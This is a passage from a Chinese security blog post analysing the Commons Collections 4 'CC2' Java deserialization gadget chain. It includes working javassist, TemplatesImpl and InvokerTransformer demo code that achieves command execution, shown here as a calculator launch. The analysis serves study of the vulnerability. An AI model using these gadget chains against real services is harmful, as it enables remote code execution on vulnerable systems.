class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">       <span class="comment">//ct.writeFile(&quot;People2&quot;);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//通过反射调用对象</span></span><br><span class="line">       Class cla=ct.toClass();</span><br><span class="line">       <span class="comment">//实例化对象</span></span><br><span class="line">       Object o=cla.newInstance();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-3.png" title="恶意代码实现效果"></p><h2 id="PriorityQueue优先级队列"><a href="#PriorityQueue优先级队列" class="headerlink" title="PriorityQueue优先级队列"></a>PriorityQueue优先级队列</h2><blockquote><p>PriorityQueue类在Java1.5中引入。PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator（比较器）在队列实例化的时排序。要求使用Java Comparable和Comparator接口给对象排序，并且在排序时会按照优先级处理其中的元素。</p></blockquote><p>顾名思义，它是队列的一种实现方式，但不同于普通队列Queue（先进先出），它可通过比较器Comparator实现数据之间谁排在前面谁排在后面（上沉该元素）。</p><p>PriorityQueue队列常用方法：</p><ul><li>add()：添加数组元素，添加失败会抛出异常。</li><li>offer()：添加数组元素，添加失败会返回false。</li><li>poll()：取出队顶数组元素，并删除该元素，失败会抛出异常。</li><li>peek()：查询队顶数组元素，但不删除该元素。</li><li>remove(): 取出队顶数组元素，并删除该元素，失败会返回null。</li></ul><p>PriorityQueue队列实现用法：</p><ul><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;(); &#x2F;&#x2F;默认优先级队列，规则从小到大</Integer></li><li>PriorityQueue<Integer> queue&#x3D;new PriorityQueue&lt;&gt;( (a,b)-&gt;(b-a)); &#x2F;&#x2F;设置比较器，从大到小排列</Integer></li></ul><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//默认优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//设置了比较规则的优先级队列</span></span><br><span class="line">        PriorityQueue&lt;Integer&gt; pq2=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;( (a,b)-&gt;(b-a));</span><br><span class="line"></span><br><span class="line">        pq.add(<span class="number">3</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出，默认从小到大</span></span><br><span class="line">        System.out.print(<span class="string">&quot;默认优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        pq2.add(<span class="number">3</span>);</span><br><span class="line">        pq2.add(<span class="number">1</span>);</span><br><span class="line">        pq2.add(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//默认优先级队列输出</span></span><br><span class="line">        System.out.print(<span class="string">&quot;设置比较器优先级队列输出:&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.print(pq2.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-13.png" title="优先级队列"></p><p>自定义使用方法：</p><ul><li>类实现了Comparable接口，定义了比较方法，直接使用即可PriorityQueue&lt;类名&gt; queue&#x3D;new PriorityQueue&lt;&gt;();</li><li>当传递对象元素未实现Comparable接口，可自定义新Comparable<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="comment">////判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li></ul><p>其中进行判断的比较器参数o1,o2，其中o1表示新插入的元素，o2表示被比较的元素也就是插入的前面一个元素。其中最后return 1表示当前比较的两个元素顺序正确，-1表示顺序不正确，不正确后将新插入的元素进行上沉操作（也就是向前排），然后循环比较上沉后的前面一个元素，继续判断直到顺序正确。</p><p><img src="/posts/7e30cd4a/cc2-14.png" title="参数描述"></p><p>简单实现效果：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PriorityQueue&lt;People&gt; pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;People&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(People o1, People o2)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> o1.getAge()-o2.getAge()&gt;<span class="number">0</span>?-<span class="number">1</span>:<span class="number">1</span>; <span class="comment">//判断数值从大到小，如果第一个元素数值比第二个大，返回1标识顺序正确，否则返回-1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;默认添加顺序:&quot;</span>);</span><br><span class="line">        People people1=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小痴&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        People people2=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小笨&quot;</span>,<span class="number">26</span>);</span><br><span class="line">        People people3=<span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;小臭&quot;</span>,<span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;经过比较器后的顺序:&quot;</span>);</span><br><span class="line">        pq.add(people1);</span><br><span class="line">        pq.add(people2);</span><br><span class="line">        pq.add(people3);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            System.out.println(pq.poll().show());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-15.png" title="实现"></p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/7e30cd4a/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/7e30cd4a/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/7e30cd4a/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/7e30cd4a/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/7e30cd4a/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/7e30cd4a/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/7e30cd4a/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-35.png" title="实现demo"></p><p>其中的空指针的报错原因是在赋值传递变量时没有指向对象，然后在调用时直接通过该变量去调用对应的方法导致报错，但不影响执行效果。</p><h1 id="0x04、CC2利用链分析"><a href="#0x04、CC2利用链分析" class="headerlink" title="0x04、CC2利用链分析"></a>0x04、CC2利用链分析</h1><h2 id="逆推调用链"><a href="#逆推调用链" class="headerlink" title="逆推调用链"></a>逆推调用链</h2><p>分析CC1链的时候知道目的是调用<code>InvokerTransformer.transform()</code>方法，CC2链的后半段利用链跟CC1链相同，那就从不同的地方接着分析。<br>在搜寻<code>InvokerTransformer.transform()</code>方法的时候，CC2链中<code>TransformingComparator.compare()</code>方法对其进行了调用。<br><img src="/posts/7e30cd4a/cc2-5.png" title="TransformingComparator.compare()"></p><p>但该方法在cc1链中也调用了为啥不行，因为在<code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口，而CC1链中依赖<code>Commons Collections3</code>版本，3版本中<code>TransformingComparator</code>类未实现序列化接口，因此入口不成立。</p><p><code>Commons Collections4</code>版本中<code>TransformingComparator</code>类实现了序列化接口。</p><p><img src="/posts/7e30cd4a/cc2-6.png" title="实现了序列化接口"></p><p>其中由构造函数传入<code>transformer</code>对象可控</p><p><img src="/posts/7e30cd4a/cc2-7.png" title="构造函数传入"></p><p>简单实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//调用TransformingComparator执行compare方法。</span></span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//随便传入2个参数比较，只为调用.transform()方法</span></span><br><span class="line">        cp.compare(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/7e30cd4a/cc2-8.png" title="实现demo"></p><p>接下来看在哪调用了<code>compare()</code>方法<br>有很多类都进行了调用，其中cc2链中的调用为<code>PriorityQueue</code>类</p><p><img src="/posts/7e30cd4a/cc2-9.png" title="调用情况"></p><p><code>PriorityQueue</code>类中<code>siftUpUsingComparator</code>、<code>siftDownUsingComparator</code>两个方法都进行了调用，再分别查看这两个方法在哪进行了调用。</p><p><strong>siftUpUsingComparator：</strong><br>先是在同类的<code>siftUp</code>方法中进行了调用</p><p><img src="/posts/7e30cd4a/cc2-10.png" title="siftUp"></p><p><code>offer</code>、<code>removeAt</code>这两个方法调用了</p><p><img src="/posts/7e30cd4a/cc2-11.png" title="siftUp"></p><p>追溯调用<code>offer</code>、<code>removeAt</code>者两个方法，发现这两个方法被调用的情况有很多，直观上也没有找到对应的入口，就先看另外一个方法</p><p><img src="/posts/7e30cd4a/cc2-12.png" title="removeAt"></p><p><strong>siftDownUsingComparator：</strong><br><code>siftDownUsingComparator</code>方法在<code>siftDown</code>方法中被调用</p><p><img src="/posts/7e30cd4a/cc2-16.png" title="siftDown"></p><p>继续向上，<code>siftDown</code>方法有三个方法进行了调用，其中<code>heapify</code>方法在反序列化<code>readObject</code>方法中调用</p><p><img src="/posts/7e30cd4a/cc2-17.png" title="siftDown"><br><img src="/posts/7e30cd4a/cc2-18.png" title="heapify"></p><h2 id="正向分析调用链"><a href="#正向分析调用链" class="headerlink" title="正向分析调用链"></a>正向分析调用链</h2><p>找到了反序列化入口，开始分析下调用情况</p><p><img src="/posts/7e30cd4a/cc2-19.png" title="readObject"></p><p>通过注释也不难明白，通过for循环读取序列化数据存在队列中，最后进行堆排序<code>heapify()</code><br>堆排列中通过循环数组长度（size），获取每个元素并执行<code>siftDown</code>方法，其中的长度验证可以调试查看是否为数组长度</p><p><img src="/posts/7e30cd4a/cc2-20.png" title="size验证"><br><img src="/posts/7e30cd4a/cc2-21.png" title="size验证"></p><p>为数组长度接下来进行堆排序<code>heapify()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中来理解<code>size &gt;&gt;&gt; 1</code>, <code>&gt;&gt;&gt;</code>为无符号右移，将size的值转换成二进制并将二进制数值整体向右移动<code>&gt;&gt;&gt;</code>后面数字的位数<br>比如这里size为3，二进制为<font color="red">0000…0000 0011</font> (整数类型有32位的长度，为了方便省略中间重复的0)，<code>&gt;&gt;&gt; 1</code>无符号右移1位<br>对应的二进制为<font color="red">0000…0000 0001</font>，即10进制为1。此时size大小为1。</p><p>所以当size小于2时，for循环中i的值就为<code>0-1=-1</code>，直接跳出循环，不会执行<code>siftDown</code>方法，设计意义也是为了有2个及以上的队列元素才进行排序操作。<br>因此满足此条件，必须给queue队列添加2个及以上元素，才能执行<code>siftDown</code>方法。</p><p>接下来到<code>siftDown</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    